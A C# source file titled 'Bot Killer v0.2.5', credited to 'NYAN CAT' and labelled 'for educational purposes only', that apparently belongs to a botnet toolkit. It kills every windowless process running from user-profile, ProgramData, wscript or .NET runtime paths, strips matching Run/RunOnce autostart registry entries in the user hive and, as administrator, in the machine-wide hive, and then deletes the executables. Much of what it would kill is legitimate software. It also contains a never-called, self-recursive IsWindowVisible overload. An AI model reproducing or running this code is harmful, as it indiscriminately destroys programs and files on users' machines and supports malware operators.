using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Security.Principal;

//       │ Author     : NYAN CAT
//       │ Name       : Bot Killer v0.2.5
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.

namespace BotKiller
{
    class Program
    {
        static void Main()
        {
            RunBotKiller();
        }

        public static void RunBotKiller()
        {
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    string processName = p.MainModule.FileName;
                    if (Inspection(processName))
                        if (!IsWindowVisible(p.MainWindowHandle))
                        {
                            p.Kill();
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\Run", processName);
                            RegistryDelete(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", processName);
                            System.Threading.Thread.Sleep(100);
                            File.Delete(processName);
                        }
                }
                catch { }
            }
        }

        private static bool Inspection(string threat)
        {
            if (threat == Process.GetCurrentProcess().MainModule.FileName) return false;
            if (threat.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))) return true;
            if (threat.Contains(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))) return true;
            if (threat.Contains("wscript.exe")) return true;
            if (threat.Contains(RuntimeEnvironment.GetRuntimeDirectory())) return true;
            return false;
        }

        private static bool IsWindowVisible(string lHandle)
        {
            return IsWindowVisible(lHandle);
        }

        private static void RegistryDelete(string regPath, string payload)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true))
            {
                if (key != null)
                    foreach (string valueOfName in key.GetValueNames())
                    {
                        if (key.GetValue(valueOfName).ToString().Equals(payload))
                            key.DeleteValue(valueOfName);
                    }
            }
            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
                {
                    if (key != null)
                        foreach (string valueOfName in key.GetValueNames())
                        {
                            if (key.GetValue(valueOfName).ToString().Equals(payload))
                                key.DeleteValue(valueOfName);
                        }
                }
            }
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool IsWindowVisible(IntPtr hWnd);

    }
}